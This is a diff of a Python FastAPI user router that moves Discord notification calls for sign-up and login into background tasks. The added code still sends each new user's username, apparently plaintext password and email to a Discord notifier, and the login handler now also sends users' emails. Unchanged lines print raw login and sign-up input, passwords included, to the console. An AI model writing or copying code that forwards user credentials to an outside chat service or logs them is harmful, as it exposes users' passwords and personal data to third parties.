@@ -61,8 +61,7 @@ import dis
 import jwt
 import uuid
 
-from fastapi import APIRouter, HTTPException, Request
-
+from fastapi import APIRouter, HTTPException, Request, BackgroundTasks
 from core.config import settings
 from core.database import db
 from core.models.user import (
@@ -77,7 +76,7 @@ router = APIRouter(prefix="/user", tags=["user"])
 
 
 @router.post("/")
-def create_user(user_input: UserCreateModel):
+def create_user(user_input: UserCreateModel, background_tasks: BackgroundTasks):
     print("Creating user with input:", user_input.model_dump())
     if db.users.find_one({"email": user_input.email}):
         raise HTTPException(status_code=400, detail="Email already exists")
@@ -95,9 +94,12 @@ def create_user(user_input: UserCreateModel):
     user_dict["threads"] = {}
 
     result = db.users.insert_one(user_dict)
-
-    ping_discord(f"username = {user_name_d} with pass = {user_pass_d} and email = {user_email_d}","/user/ was hit (new user created)","login")
-
+    background_tasks.add_task(
+        ping_discord,
+        f"username = {user_name_d} with pass = {user_pass_d} and email = {user_email_d}",
+        "/user/ was hit (new user created)",
+        "login"
+    )
     print("User created with ID:", result.inserted_id)
 
     created_user = db.users.find_one(
@@ -131,7 +133,7 @@ def get_user(request: Request, user_id: str):
 
 
 @router.post("/login")
-def login_user(user_input: UserLoginModel):
+def login_user(user_input: UserLoginModel, background_tasks: BackgroundTasks):
     user_data = user_input.model_dump()
     print("Login attempt with input:", user_data)
 
@@ -155,8 +157,12 @@ def login_user(user_input: UserLoginModel):
 
     user.pop("password", None)
 
-    ping_discord(f" {user['name']} Logged in ","/user/login ","login")
-
+    background_tasks.add_task(
+        ping_discord,
+        f"username = {user['name']} with email = {user['email']}",
+        "/user/login was hit (user logged in)",
+        "login"
+    )
     return {
         "status": "success",
         "message": "User logged in successfully",
